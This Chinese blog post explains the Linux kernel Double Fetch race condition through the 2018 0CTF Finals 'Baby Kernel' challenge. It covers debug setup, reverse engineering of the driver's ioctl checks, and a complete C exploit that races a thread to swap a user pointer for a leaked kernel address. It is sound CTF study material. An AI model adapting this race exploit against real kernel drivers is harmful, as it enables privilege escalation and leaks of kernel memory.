---
title: 关于 kernel-Double Fetch 的学习总结
top: 44
tags:
  - kernel-Double Fetch
  - kernel
categories:
  - 学习总结
abbrlink: 6176bce9
---

### 概述

>`Double Fetch` 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。
>
>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 `copy_from_user` 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但**在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常**。
>
>一个典型的 `Double Fetch` 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" />

因为 `CTF wiki` 上这里总结的非常好（建议反复阅读 QAQ ），即使再叙述一遍也感觉意义不大，所以这里直接进行了引用

原文链接：[Double Fetch - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/)



### 2018 0CTF Finals Baby Kernel

题目链接：https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel

#### 前置知识

##### SMAP/SMEP

`SMAP` 即`管理模式访问保护`（Supervisor Mode Access Prevention），当开启这个保护后，在内核模式下无论是写入或者读取用户模式下的数据都会造成内存异常。`SMEP` （Supervisor Mode Execution Prevention）则是 `管理模式执行保护`，阻止内核空间中执行用户空间的数据。



##### 启动文件的设置

`lsmod` 命令查看模块基地址为 `0` ，需要本地调试的时候修改 `init` 文件（改完之后，再将文件系统打包），将原本的 `setsid cttyhack setuidgid 1000 sh` 改为 `setsid cttyhack setuidgid 0 sh` 即可。



关闭 `kaslr` 的话，在 `start.sh` 文件的此处加上 `nokaslr` 即可（如下）

![image-20230329204004810](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png)



内核中以 `printk` 输出的内容，可以通过 `dmesg` 命令查看。前提是需要关闭 `dmesg_restrict` ，否则无法查看 `printk` 信息，关闭方法如下：

```shell
echo 0 > /proc/sys/kernel/dmesg_restrict
```

系统内核参数 `kernel.dmesg_restrict` 用于控制普通用户是否可以查看内核日志 `dmesg`。当该参数值为1时，只有 `root` 用户才能查看内核日志，而普通用户则无法查看。而将该参数值设置为0，允许普通用户查看内核日志。



**注意：本题由于从内核中访问了用户态的数据，所以要关闭 `SMAP` 保护，否则会导致 `kernel panic`**

#### 逆向分析

当 `a2` 为 `0x1337` 会做三个检查

![image-20230403155425780](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png)

发现第一个 `_chk_range_not_ok` 函数的第三个参数是 `(&current_task) + 0x1358` ，这个位置是 `stack pointer` 字段，记录了栈区的结束地址，也就是用户空间的最大范围。通过调试也可以印证（如下）

![image-20230403174212778](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png)



`_chk_range_not_ok` 函数是第一个参数加第二个参数大于第三个参数的情况下返回 `True`  ，但该函数的外面还有一个 `!` ，所以这里的想过 `if` 的话，需要满足第一个参数加第二个参数小于第三个参数

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" />



这里出现了一个 `*(_QWORD *)v5` 和 `*(int *)(v5+8)` ，这个格式可以推断出来他们是结构体中的成员变量，因为拿 `*(_DWORD)(v5+8)` 去和 `flag` 的长度做了比较，可以猜测 `*(_DORD)(v5+8)` 是 我们输入`flag` 字符串的长度，结合前面分析 `_chk_range_not_ok` 函数第三个参数是用户空间的最大范围，所以这里是某个值加上输入字符串的长度，要小于用户区的最大范围，因此推断这个值应该是我们输入 `flag` 的起始地址

![image-20230403211351891](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png)



所以创建一个结构体，此时的代码如下

![image-20230404092707055](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png)



查看下面的代码知道 `v2` 就是 `rdx` ，也就是 `baby_ioctl` 函数第三个参数，后来将这个参数赋值为 `v5` ，因此在用户模式调用 `baby_ioctl` 函数时，第三个参数传入提前写好的结构体的指针即可。

![image-20230404092839113](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png)



最后完整的分析一遍 `baby_ioctl` 函数（如下图）

![image-20230404093312297](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png)

在调用 `ioctl` 的时候，第二个参数如果为 `0x6666` 则会泄露出内核中存放 `flag` 的地址。

如果第二个参数为 `0x1337` 并且第三个参数加上 `0x10` 小于用户区的最大空间并且第三个参数加上字符串的长度小于用户区的最大空间并且字符串的长度（这个长度并非真的是字符串的实际长度，而是结构体中 `length` 成员的值）要等于内核中存放的 `flag` 长度，就去遍历 `flag_addr` 与 真正的 `flag` 做对比，如果完全一样则将 `flag` 输出出来。



#### 漏洞产生

正常分析代码的话，确实找不到漏洞。这个程序希望我们拿用户态程序中的 `flag` 和内核中 `flag` 做对比，只有完全一样才输出 `flag`，程序专门检测了用户态程序中 `flag` 的地址是否位于用户区内。现在的情况做成图片（如下）

![image-20230404102814465](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png)

我们传入 `ioctl` 函数第三个参数是 `0x601100` （地址只是举个例子）也就是结构体的地址，结构体第一个成员是指针 `ptr`，只有 `ptr` 在用户区内（也就是为 `flag in the user_space`）才能通过第一个检查，不过这样就没办法通过第二个检查了，因为我们不可能碰巧在用户区自定义的 `flag` 和内核中的 `flag` 一样。

可是如果我们开启一个线程，在程序通过第一个检查后，不断将 `ptr` 改成 `flag in the kernel_space` （提前将内核中的 `flag` 地址泄露出来），这样到了第二个检查时，程序会将内核中的 `flag` 与自己做检查，从而绕过第二个检查，输出 `flag` 。问题在于我们不确定什么时候程序通过了第一个检查，所以要写一个循环，不断执行 `ioctl` ，同时开启线程也不断循环去改变 `ptr` ，当碰巧程序通过了第一个检查时，线程正好也将 `ptr` 改变成了 `flag in the kernel_space` ，此时得到 `flag` 



#### EXP

```c
//gcc exp.c -o exp -w -static -pthread
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

size_t true_flag_address;
int over=0;
struct info
{
	char *flag;
	int length;
};

void change_flag(void *a)
{
    struct info *s = (struct info *)a;
    while (over==0)
    {
        s->flag = (char *)true_flag_address;
    }
	printf("debug1 %d \n",s->length);
}


int main()
{
    char buf[0x1000];
    struct info flag_info;
    pthread_t tt;
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    int fd1 = open("/dev/baby", O_RDWR);
    printf("fd1------->%d\n", fd1);
    ioctl(fd1, 0x6666, 0x0);
    system("dmesg > 1.txt");
    int fd2 = open("1.txt", O_RDWR);
    lseek(fd2, -0x1000, SEEK_END);
    read(fd2, buf, 0x1000);
    close(fd2);
    char *index = strstr(buf, "Your flag is at ");
    if (index == NULL)
    {
        printf("not found!");
        exit(-1);
    }
    else
    {
        index += 16;
        printf("flag address ------> ");
        write(1, index, 16);
    }

    char *str = NULL;
    true_flag_address = strtoull(index, &str, 16);
    printf("\nflag1 true_flag_adddress ----------> %llx\n", true_flag_address);

    char false_flag[] = "a";
    flag_info.length = 33;
    flag_info.flag = false_flag;

    pthread_create(&tt, NULL, change_flag, &flag_info);

    for (int i = 0; i < 1000; i++)
    {
        ioctl(fd1, 0x1337, &flag_info);
        flag_info.flag = false_flag;
    }
    over = 1;
    pthread_join(tt, NULL);
    close(fd1);
    system("dmesg | grep flag");
    return 0;
}
```

![image-20230404104852837](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png)



### 参考文章：

[[原创\]Linux Kernel Pwn_1_Double fetch-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8)

[Double Fetch - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1)

[(47条消息) Linux kernel Exploit 内核漏洞学习(1)-Double Fetch_钞sir的博客-CSDN博客](https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502)